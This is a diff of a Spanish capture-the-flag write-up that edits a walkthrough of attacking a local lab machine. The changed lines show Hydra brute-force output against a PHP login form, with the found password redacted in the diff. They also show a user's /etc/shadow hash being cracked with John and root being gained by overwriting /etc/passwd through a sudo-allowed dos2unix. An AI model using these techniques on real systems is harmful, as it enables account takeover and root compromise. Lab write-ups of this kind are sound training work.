@@ -84,7 +84,7 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-02 14:16:23
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344403 login tries (l:1/p:14344403), ~896526 tries per task
 [DATA] attacking http-post-form://172.17.0.2:80/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d:F=Credenciales incorrectas.
-[80][http-post-form] host: 172.17.0.2   login: admin   password: christelle
+[80][http-post-form] host: 172.17.0.2   login: admin   password: xxxxxxxxxxxx
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-02 14:16:25
 ```
@@ -212,7 +212,8 @@ pero no puedo aprovecharme de el para hacer la escalada asi que sigo buscando en
 que para mi ya es conocida esta cadena, resulta ser la password hasheada del user darksblack que se almacena en el archivo /etc/shadow
 asi que creo un archivo que contenga este hash en mi maquina atacante y se la paso a john
 
-![Screenshot From 2024-11-02 15-34-12](https://github.com/user-attachments/assets/b92cf61a-49b3-4158-86cb-e52ebfa7ff38)
+![WhatsApp Image 2024-11-02 at 17 46 25](https://github.com/user-attachments/assets/2a308318-6f20-4d96-b66b-adee4782a645)
+
 
 y logre conseguir la password del user darksblack asi que puedo cambiar de user
 
@@ -344,8 +345,8 @@ por lo que ahora ya teniendo modificado el archivo 'escalada' procedo usar el bi
 ```
 sudo /usr/bin/dos2unix -f -n escalada /etc/passwd
 dos2unix: converting file escalada to file /etc/passwd in Unix format...
+su root
 ```
-`su root`
 
 ![Screenshot From 2024-11-02 16-33-40](https://github.com/user-attachments/assets/8645136d-cd2b-457a-90bb-41a99eca4655)
 
